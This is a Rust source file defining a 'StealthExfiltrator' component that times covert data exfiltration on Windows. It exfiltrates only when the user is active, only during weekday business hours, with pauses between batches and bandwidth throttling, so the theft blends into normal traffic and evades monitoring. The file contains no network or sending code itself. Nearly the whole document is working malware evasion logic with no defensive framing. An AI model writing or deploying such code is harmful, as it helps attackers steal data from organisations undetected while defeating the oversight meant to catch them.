use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::Mutex;

pub struct StealthExfiltrator {
    bandwidth_limit: u64, // bytes per second
    active_hours_only: bool,
    last_activity: Arc<Mutex<Instant>>,
    pause_duration: Duration,
}

impl StealthExfiltrator {
    pub fn new() -> Self {
        Self {
            bandwidth_limit: 100 * 1024, // 100KB/s
            active_hours_only: true,
            last_activity: Arc::new(Mutex::new(Instant::now())),
            pause_duration: Duration::from_secs(300), // 5 min pause between batches
        }
    }
    
    pub async fn should_exfiltrate(&self) -> bool {
        // Check if user is active
        if self.is_user_idle() {
            return false;
        }
        
        // Check active hours (9 AM - 5 PM)
        if self.active_hours_only && !self.is_business_hours() {
            return false;
        }
        
        // Check if enough time passed since last exfil
        let last = *self.last_activity.lock().await;
        if last.elapsed() < self.pause_duration {
            return false;
        }
        
        true
    }
    
    fn is_user_idle(&self) -> bool {
        unsafe {
            use windows::Win32::UI::WindowsAndMessaging::*;
            use windows::Win32::System::Threading::*;
            
            // Check last input time
            let mut last_input = LASTINPUTINFO {
                cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
                dwTime: 0,
            };
            
            if GetLastInputInfo(&mut last_input).as_bool() {
                let tick_count = GetTickCount();
                let idle_time = tick_count - last_input.dwTime;
                
                // If idle more than 5 minutes
                return idle_time > 5 * 60 * 1000;
            }
            
            false
        }
    }
    
    fn is_business_hours(&self) -> bool {
        use chrono::Local;
        
        let now = Local::now();
        let hour = now.hour();
        let weekday = now.weekday().num_days_from_monday();
        
        // Monday = 0, Friday = 4
        if weekday > 4 {
            return false; // Weekend
        }
        
        hour >= 9 && hour < 17
    }
    
    pub async fn throttle(&self, bytes_sent: u64) {
        let expected_time = Duration::from_secs_f64(bytes_sent as f64 / self.bandwidth_limit as f64);
        tokio::time::sleep(expected_time).await;
    }
    
    pub async fn mark_activity(&self) {
        *self.last_activity.lock().await = Instant::now();
    }
    
    pub fn set_bandwidth_limit(&mut self, bytes_per_sec: u64) {
        self.bandwidth_limit = bytes_per_sec;
    }
}